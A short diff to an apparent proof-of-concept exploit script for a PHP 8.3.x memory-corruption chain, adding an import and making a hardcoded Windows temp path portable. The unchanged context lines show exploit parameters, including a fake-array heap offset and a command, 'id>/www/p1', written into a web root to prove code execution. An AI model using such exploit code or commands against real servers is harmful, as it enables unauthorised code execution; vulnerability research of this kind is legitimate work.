@@ -12,6 +12,7 @@ Chain (same 8.3 family as 8.3.35):
 Usage:
     python poc/poc_8333.py
 """
+import os
 import sys, os, time, subprocess
 
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
@@ -27,7 +28,7 @@ S_OFF = 0xF6398         # fake-array (ht field) offset from chunk base — 8.3.x
 CMD = "id>/www/p1"
 FETCH = "/p1"
 
-GH = r"C:\Users\likat\.qwen\tmp\p2s"
+GH = os.path.join(os.path.expanduser("~"), ".qwen", "tmp", "p2s")
 TMP = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "tmp_8333")
 
 
